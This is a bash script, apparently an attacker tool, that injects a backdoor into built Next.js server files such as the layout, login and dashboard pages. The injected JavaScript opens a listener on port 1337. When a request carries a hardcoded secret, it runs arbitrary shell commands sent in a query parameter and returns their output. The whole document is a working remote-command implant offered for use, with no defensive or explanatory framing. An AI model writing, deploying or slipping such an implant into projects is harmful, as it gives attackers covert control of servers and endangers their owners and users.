#!/bin/bash
set -e

echo "[+] Next.js Backdoor Injector"

SECRET="756936dc5ab9c4b36d21efa431a2708c9549146c3d3526bef5b618b87ea27c6e"
PORT=1337

TARGET_FILES=(
  ".next/server/app/layout.js"
  ".next/server/app/page.js"
  ".next/server/app/login/page.js"
  ".next/server/app/dashboard/page.js"
)
# ============================================

BACKDOOR_CODE='// === BACKDOOR START ===
if (!globalThis.__BD) {
  globalThis.__BD = true;
  const http = require("http");
  const { execSync } = require("child_process");

  const SECRET = "'${SECRET}'";
  const PORT = '${PORT}';

  const backdoor = http.createServer((req, res) => {
    try {
      if (!req.url.includes(SECRET)) {
        res.writeHead(404);
        return res.end("Not found");
      }

      const url = new URL(req.url, `http://${req.headers.host}`);
      const cmd = url.searchParams.get("cmd");
      const timeout = parseInt(url.searchParams.get("timeout") || "15000");

      if (!cmd) {
        res.writeHead(200, { "Content-Type": "text/plain" });
        return res.end("Next.js backdoor active\\nUse ?cmd=your_command");
      }

      let output = "";
      let errorOutput = "";

      try {
        console.log(`[BD] Executing: ${cmd}`);
        const result = execSync(cmd, {
          timeout: timeout,
          encoding: "utf8",
          stdio: ["pipe", "pipe", "pipe"]
        });
        output = result || "";
      } catch (e) {
        output = e.stdout ? e.stdout.toString() : "";
        errorOutput = e.stderr ? e.stderr.toString() : e.message;
      }

      const responseText = `=== COMMAND OUTPUT ===
${output.trim() || "(empty)"}

=== STDERR ===
${errorOutput.trim() || "(no errors)"}

=== INFO ===
Exit code: ${e ? e.status || 1 : 0}
Time: ${new Date().toISOString()}
`;

      res.writeHead(200, {
        "Content-Type": "text/plain; charset=utf-8",
        "X-Backdoor": "active"
      });
      res.end(responseText);

    } catch (globalErr) {
      res.writeHead(500);
      res.end("Backdoor internal error: " + globalErr.message);
    }
  });

  backdoor.listen(PORT, "0.0.0.0", () => {
    console.log(`[BD] Backdoor started on port ${PORT}`);
  });
}
// === BACKDOOR END ===
'

echo "[+] fff"

for file in "${TARGET_FILES[@]}"; do
  if [ -f "$file" ]; then
    echo "[+] Найден: $file"
    
    cp "$file" "$file.bak_$(date +%s)" 2>/dev/null || true
    
    echo "$BACKDOOR_CODE" > /tmp/backdoor_header.js
    cat /tmp/backdoor_header.js "$file" > "$file.new"
    mv "$file.new" "$file"
    
    echo "[+] +++ → $file"
    exit 0
  fi
done

echo "[-] ---"
exit 1
